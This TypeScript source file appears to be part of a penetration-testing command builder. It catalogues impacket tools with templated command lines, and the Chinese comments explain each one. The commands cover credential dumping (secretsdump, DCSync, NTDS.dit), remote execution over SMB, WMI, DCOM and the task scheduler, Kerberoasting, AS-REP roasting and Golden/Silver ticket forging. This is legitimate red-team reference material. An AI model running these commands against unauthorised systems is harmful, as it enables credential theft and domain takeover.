import type { Tool } from '../../types';
import { buildImpacketAuth, buildImpacketDomainAuth, v } from '../../lib/auth';

/**
 * 所有命令均按 Kali Linux impacket-scripts 包的标准命名 (impacket-<name>)
 * 参数已与 impacket 官方 examples/*.py 的 argparse 定义逐一核对
 * 参考: https://github.com/fortra/impacket / https://www.kali.org/tools/impacket-scripts/
 */
export const impacketTools: Tool[] = [
  {
    id: 'secretsdump',
    name: 'impacket-secretsdump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/secretsdump.py',
    description: '导出密码哈希和Kerberos密钥 (SAM/LSA/NTDS)',
    commands: [
      {
        id: 'secretsdump-local',
        title: '本地 SAM 导出',
        description: '从本地导出的注册表 hive 文件中提取 (target 为关键字 LOCAL)',
        build: () => `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`,
      },
      {
        id: 'secretsdump-remote',
        title: '远程 SAM/LSA 导出',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p)}`,
      },
      {
        id: 'secretsdump-dcsync',
        title: 'DCSync 导出所有域用户哈希',
        description: '需要域管理员或复制权限 (Replicating Directory Changes)',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p)} -just-dc`,
      },
      {
        id: 'secretsdump-dcsync-ntlm',
        title: 'DCSync 仅导出 NTLM 哈希',
        description: '跳过 Kerberos 密钥，速度更快',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p)} -just-dc-ntlm`,
      },
      {
        id: 'secretsdump-dcsync-user',
        title: 'DCSync 导出指定用户',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p)} -just-dc-user ${v(p.domain, 'DOMAIN')}/${v('', 'TARGET_USER')}`,
      },
      {
        id: 'secretsdump-ntds',
        title: '本地解析 NTDS.dit',
        description: '从 ntdsutil/VSS 导出的 NTDS.dit 与 SYSTEM hive 离线提取 (target 为关键字 LOCAL)',
        build: () => `impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile ntds_dump LOCAL`,
      },
    ],
  },
  {
    id: 'psexec',
    name: 'impacket-psexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/psexec.py',
    description: '通过服务管理器 (RemCom) 执行命令并获取交互式 shell',
    commands: [
      {
        id: 'psexec-shell',
        title: 'PSExec 交互式 Shell',
        description: '不传 command 时默认执行 cmd.exe',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p)}`,
      },
      {
        id: 'psexec-command',
        title: 'PSExec 执行单条命令',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p)} "whoami"`,
      },
      {
        id: 'psexec-upload-exec',
        title: '上传并执行可执行文件',
        description: '-c 将本地文件复制到目标 ADMIN$ 后执行，可通过 -path 指定落地目录',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p)} -c ${v(p.fileName, 'FILE.EXE')}`,
      },
    ],
  },
  {
    id: 'wmiexec',
    name: 'impacket-wmiexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/wmiexec.py',
    description: '通过 WMI 执行命令 (默认不落地二进制)',
    commands: [
      {
        id: 'wmiexec-shell',
        title: 'WMI 交互式 Shell',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p)}`,
      },
      {
        id: 'wmiexec-command',
        title: 'WMI 执行单条命令',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p)} "ipconfig /all"`,
      },
      {
        id: 'wmiexec-powershell',
        title: 'WMI PowerShell Shell',
        description: '-shell-type 指定 shell 类型 (cmd/powershell)',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p)} -shell-type powershell`,
      },
      {
        id: 'wmiexec-silent',
        title: '静默执行 (不回显输出)',
        description: '-silentcommand 不读取输出文件，规避 ADMIN$ 写入读取',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p)} -silentcommand "${v('', 'COMMAND')}"`,
      },
    ],
  },
  {
    id: 'smbexec',
    name: 'impacket-smbexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/smbexec.py',
    description: '通过 SMB 和服务管理器执行命令 (不落地二进制)',
    commands: [
      {
        id: 'smbexec-shell',
        title: 'SMBExec Shell',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p)}`,
      },
      {
        id: 'smbexec-server-mode',
        title: 'SERVER 模式执行',
        description: '-mode SERVER 通过本地 SMB 服务器回传输出，目标无外联时改用默认 SHARE 模式',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p)} -mode SERVER`,
      },
    ],
  },
  {
    id: 'atexec',
    name: 'impacket-atexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/atexec.py',
    description: '通过任务计划 (Task Scheduler / TSCH) 执行命令',
    commands: [
      {
        id: 'atexec-command',
        title: 'ATExec 执行命令',
        build: (p) => `impacket-atexec ${buildImpacketAuth(p)} "systeminfo"`,
      },
    ],
  },
  {
    id: 'dcomexec',
    name: 'impacket-dcomexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/dcomexec.py',
    description: '通过 DCOM 执行命令 (默认 MMC20.Application)',
    commands: [
      {
        id: 'dcomexec-shell',
        title: 'DCOM Shell (MMC20)',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)}`,
      },
      {
        id: 'dcomexec-shellwindows',
        title: 'DCOM ShellWindows 对象',
        description: '-object 可选 MMC20 / ShellWindows / ShellBrowserWindow',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)} -object ShellWindows "${v('', 'COMMAND')}"`,
      },
    ],
  },
  {
    id: 'GetUserSPNs',
    name: 'impacket-GetUserSPNs',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py',
    description: 'Kerberoasting - 获取服务账户的 TGS 票据 (target 为 domain/user，无 @host)',
    commands: [
      {
        id: 'getuserspns-request',
        title: '列举并请求所有 SPN 票据',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -request`,
      },
      {
        id: 'getuserspns-output',
        title: '导出到文件供 hashcat 破解',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -request -outputfile kerberoast_hashes.txt`,
      },
      {
        id: 'getuserspns-target',
        title: '请求指定 SPN 用户的票据',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -request-user ${v('', 'SPN_USER')}`,
      },
    ],
  },
  {
    id: 'GetNPUsers',
    name: 'impacket-GetNPUsers',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py',
    description: 'AS-REP Roasting - 获取无需预认证用户的哈希',
    commands: [
      {
        id: 'getnpusers-enum',
        title: '枚举无预认证用户 (无需凭据)',
        build: (p) => `impacket-GetNPUsers ${v(p.domain, 'DOMAIN')}/ -usersfile users.txt -dc-ip ${v(p.dcIP, 'DC_IP')} -format hashcat -outputfile asrep_hashes.txt`,
      },
      {
        id: 'getnpusers-request',
        title: '从 DC 枚举 (需认证)',
        build: (p) => `impacket-GetNPUsers ${buildImpacketDomainAuth(p)} -request`,
      },
    ],
  },
  {
    id: 'getTGT',
    name: 'impacket-getTGT',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/getTGT.py',
    description: '获取 Kerberos TGT 票据 (identity 为 [domain/]user[:pass])',
    commands: [
      {
        id: 'gettgt-password',
        title: '通过密码获取 TGT',
        build: (p) => `impacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
      {
        id: 'gettgt-hash',
        title: '通过 NTLM 哈希获取 TGT',
        build: (p) => `impacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -hashes :${v(p.ntHash, 'NTHASH')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
      {
        id: 'gettgt-aes',
        title: '通过 AES Key 获取 TGT',
        build: (p) => `impacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -aesKey ${v(p.aesKey, 'AESKEY')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
    ],
  },
  {
    id: 'ticketer',
    name: 'impacket-ticketer',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ticketer.py',
    description: '伪造 Kerberos 票据 (Golden/Silver Ticket)，生成 <用户名>.ccache',
    commands: [
      {
        id: 'ticketer-golden',
        title: 'Golden Ticket (krbtgt 哈希)',
        build: (p) => `impacket-ticketer -nthash ${v(p.ntHash, 'KRBTGT_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} ${v(p.username, 'USER')}`,
      },
      {
        id: 'ticketer-silver',
        title: 'Silver Ticket (服务账户哈希)',
        build: (p) => `impacket-ticketer -nthash ${v(p.ntHash, 'SERVICE_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} -spn ${v(p.spn, 'SPN')} ${v(p.username, 'USER')}`,
      },
      {
        id: 'ticketer-export',
        title: '导出票据供 -k 使用',
        description: '生成 ccache 后需设置环境变量',
        build: (p) => `export KRB5CCNAME=${v(p.username, 'USER')}.ccache`,
      },
    ],
  },
  {
    id: 'mssqlclient',
    name: 'impacket-mssqlclient',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py',
    description: 'MSSQL 客户端 (默认端口 1433)',
    commands: [
      {
        id: 'mssqlclient-connect',
        title: 'MSSQL 连接 (SQL 认证)',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p)}`,
      },
      {
        id: 'mssqlclient-windows',
        title: 'MSSQL Windows 认证',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p)} -windows-auth`,
      },
      {
        id: 'mssqlclient-port',
        title: '指定端口连接',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p)} -port ${v(p.targetPort, 'PORT')} -windows-auth`,
      },
    ],
  },
  {
    id: 'smbclient',
    name: 'impacket-smbclient',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/smbclient.py',
    description: 'SMB 客户端 (交互式迷你 shell，支持 shares/use/put/get)',
    commands: [
      {
        id: 'smbclient-shell',
        title: 'SMB 交互式 Shell',
        description: '进入后可用 shares / use C$ / ls / get / put 等命令',
        build: (p) => `impacket-smbclient ${buildImpacketAuth(p)}`,
      },
      {
        id: 'smbclient-inputfile',
        title: '批量执行 SMB 命令',
        description: 'inputfile 每行一条迷你 shell 命令，例如: use C$ / put nc.exe / exit',
        build: (p) => `impacket-smbclient ${buildImpacketAuth(p)} -inputfile smb_commands.txt`,
      },
    ],
  },
  {
    id: 'lookupsid',
    name: 'impacket-lookupsid',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/lookupsid.py',
    description: '枚举域用户和组 (通过 SID 暴力枚举，默认 maxRid 4000)',
    commands: [
      {
        id: 'lookupsid-enum',
        title: '枚举域 SID',
        build: (p) => `impacket-lookupsid ${buildImpacketAuth(p)}`,
      },
      {
        id: 'lookupsid-maxrid',
        title: '指定最大 RID',
        build: (p) => `impacket-lookupsid ${buildImpacketAuth(p)} 5000`,
      },
    ],
  },
  {
    id: 'GetADUsers',
    name: 'impacket-GetADUsers',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py',
    description: '枚举域用户 (target 为 domain/user，无 @host)',
    commands: [
      {
        id: 'getadusers-all',
        title: '列举所有域用户',
        build: (p) => `impacket-GetADUsers ${buildImpacketDomainAuth(p)} -all`,
      },
      {
        id: 'getadusers-single',
        title: '查询指定用户',
        build: (p) => `impacket-GetADUsers ${buildImpacketDomainAuth(p)} -user ${v('', 'TARGET_USER')}`,
      },
    ],
  },
  {
    id: 'findDelegation',
    name: 'impacket-findDelegation',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/findDelegation.py',
    description: '查找委派账户 (非约束/约束/基于资源的约束委派)',
    commands: [
      {
        id: 'finddelegation-query',
        title: '查找委派',
        build: (p) => `impacket-findDelegation ${buildImpacketDomainAuth(p)}`,
      },
    ],
  },
  {
    id: 'rpcdump',
    name: 'impacket-rpcdump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/rpcdump.py',
    description: '枚举 RPC 端点和接口',
    commands: [
      {
        id: 'rpcdump-enum',
        title: 'RPC 枚举',
        build: (p) => `impacket-rpcdump ${buildImpacketAuth(p)}`,
      },
    ],
  },
];
